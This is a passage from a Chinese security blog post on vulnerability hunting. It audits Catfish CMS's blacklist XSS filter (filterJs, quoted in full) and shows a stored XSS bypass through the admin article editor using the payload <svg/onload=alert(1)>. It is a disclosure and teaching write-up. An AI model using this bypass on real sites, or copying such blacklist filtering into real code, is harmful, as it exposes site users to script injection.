+<p>成熟的CMS一般都存在自己对XSS、SQL注入、CSRF等漏洞的防御方案，这种情况下，纯黑盒测试的效率显然会下降，追求时间的话都会直接对其源码中针对攻击防御的代码片段进行审计，寻找其防御问题，并反向追踪该防御函数适用场景，从而挖掘相关漏洞。下文就以挖掘Catfish CMS的XSS漏洞为例。</p>
+<ul>
+<li>通过对源码的搜索，可以找到一处XSS过滤的PHP函数：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">filterJs</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(preg_match(<span class="string">"/(&lt;script)|(&lt;style)|(&lt;iframe)|(&lt;frame)|(&lt;form)|(&lt;a)|(&lt;object)|(&lt;frameset)|(&lt;bgsound)|(&lt;video)|(&lt;source)|(&lt;audio)|(&lt;track)|(&lt;marquee)/i"</span>,$str) || preg_match(<span class="string">"/(onabort)|(onactivate)|(onafter)|(onbefore)|(onblur)|(onbounce)|(oncellchange)|(onchange)|(onclick)|(oncont)|(oncopy)|(oncut)|(ondata)|(ondblclick)|(ondeactivate)|(ondrag)|(ondrop)|(onerror)|(onfilter)|(onfinish)|(onfocus)|(onhelp)|(onkey)|(onlayout)|(onlose)|(onload)|(onmouse)|(onmove)|(onpaste)|(onproperty)|(onready)|(onreset)|(onresize)|(onrow)|(onscroll)|(onselect)|(onstart)|(onstop)|(onseek)|(onsubmit)|(ontoggle)|(onunload)/i"</span>,$str))</span><br><span class="line">        &#123;</span><br><span class="line">            $str = preg_replace([<span class="string">'/&lt;script[\s\S]*?&lt;\/script[\s]*&gt;/i'</span>,<span class="string">'/&lt;style[\s\S]*?&lt;\/style[\s]*&gt;/i'</span>,<span class="string">'/&lt;iframe[\s\S]*?(&lt;\/iframe|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;frame[\s\S]*?(&lt;\/frame|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;form[\s\S]*?&gt;/i'</span>,<span class="string">'/&lt;object[\s\S]*?(&lt;\/object|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;frameset[\s\S]*?(&lt;\/frameset|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;bgsound[\s\S]*?(&lt;\/bgsound|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;video[\s\S]*?(&lt;\/video|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;source[\s\S]*?(&lt;\/source|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;audio[\s\S]*?(&lt;\/audio|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;track[\s\S]*?(&lt;\/track|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;marquee[\s\S]*?(&lt;\/marquee|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;a[\s\S]*?(&lt;\/a|\/)[\s]*&gt;/i'</span>,<span class="string">'/on[A-Za-z]+[\s]*=[\s]*[\'|"][\s\S]*?[\'|"]/i'</span>,<span class="string">'/on[A-Za-z]+[\s]*=[\s]*[^&gt;]+/i'</span>],<span class="string">''</span>,$str);</span><br><span class="line">        &#125;</span><br><span class="line">        $str = str_replace(<span class="string">'&lt;!--'</span>,<span class="string">'&amp;lt;!--'</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+<li>显而易见，该CMS采用黑名单的形式过滤XSS攻击，虽然黑名单可以在对Web应用影响最小的情况下过滤部分XSS漏洞，但由于黑名单手动添加的过滤标签，导致很可能存在过滤不完全的情况出现。这种情况下可以意识到此处很可能存在绕过。观察可知，该黑名单并没有过滤带有on*事件的HTML5标签，比如XSS最常用到的svg标签。</li>
+<li>反响追踪<code>filterJs</code>函数是否应用于CMS哪几处功能，可以发现评论、Admin管理界面多处均用到该函数。我们以管理中心的写文章功能为目标继续进行。</li>
+<li>在写文章的内容部分切换为HTML原生界面，输入svg标签的XSS payload: <code>&lt;svg/onload=alert(1)&gt; </code><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/cms-xss1.png" alt="cms1"></li>
+<li>返回用户界面浏览发现XSS攻击发生：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/cms-xss2.png" alt="cms2"></li>
+</ul>
+<h1 id="Afterwords"><a href="#Afterwords" class="headerlink" title="Afterwords."></a>Afterwords.</h1><p>工控领域由于主要业务不存在于Web方面，不论是厂商还是企业均未在安全其之上投入精力，导致问题频发。希望不久的将来，随着工控物联网的推进和国家战略跟进，工控Web安全也能随之得到应有的提升。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://hducaiji.github.io">fseeeye</a>
+            <p>原文链接：<a href="http://hducaiji.github.io/2020/06/01/mycve1/">http://hducaiji.github.io/2020/06/01/mycve1/</a>
+            <p>发表日期：<a href="http://hducaiji.github.io/2020/06/01/mycve1/">June 1st 2020, 3:19:12 pm</a>
+            <p>更新日期：<a href="http://hducaiji.github.io/2020/06/01/mycve1/">June 1st 2020, 3:31:57 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名国际许可协议4.0</a></p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/07/28/Redis-slaveof-attack/" title= "Redis Slaveof Attack">
+                    <div class="nextTitle">Redis Slaveof Attack</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/05/29/cookie-samesite/" title= "Cookie SameSite 食用指南">
+                    <div class="prevTitle">Cookie SameSite 食用指南</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fseeeye@tutanota.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/hducaiji" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/tim_qr.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="http://www.zhihu.com/people/guang-shen-78" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="wife-power">Supported by <a href="https://weibo.com/u/3525352423" target="_blank">CC</a></span><span class="iconfont-archer power">&#xe635;</span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#The-foregoing"><span class="toc-number">1.</span> <span class="toc-text">The foregoing.</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境描述与搭建"><span class="toc-number">1.1.</span> <span class="toc-text">环境描述与搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#first-vuln"><span class="toc-number">1.2.1.</span> <span class="toc-text">first vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#second-vuln"><span class="toc-number">1.2.2.</span> <span class="toc-text">second vuln</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.3.</span> <span class="toc-text">CSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PART2-Catfish-CMS"><span class="toc-number">2.</span> <span class="toc-text">PART2: Catfish CMS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Afterwords"><span class="toc-number">3.</span> <span class="toc-text">Afterwords.</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/2020/07/28/Redis-slaveof-attack/" >Redis Slaveof Attack</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2020/06/01/mycve1/" >近期的CVE挖掘总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2020/05/29/cookie-samesite/" >Cookie SameSite 食用指南</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2019/12/06/CVE-2019-11043-2/" >CVE-2019-11043 PHP-FPM RCE - Vulnerability analysis</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href= "/2019/12/05/CVE-2019-11043/" >CVE-2019-11043 PHP-FPM RCE - Vulnerability & Emersion</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href= "/2019/04/20/top/" >N/A</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cookie"><span class="iconfont-archer">&#xe606;</span>Cookie</span>
+    
+        <span class="sidebar-tag-name" data-tags="WEB"><span class="iconfont-archer">&#xe606;</span>WEB</span>
+    
+        <span class="sidebar-tag-name" data-tags="Redis"><span class="iconfont-archer">&#xe606;</span>Redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="Vuln"><span class="iconfont-archer">&#xe606;</span>Vuln</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "fseeeye"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
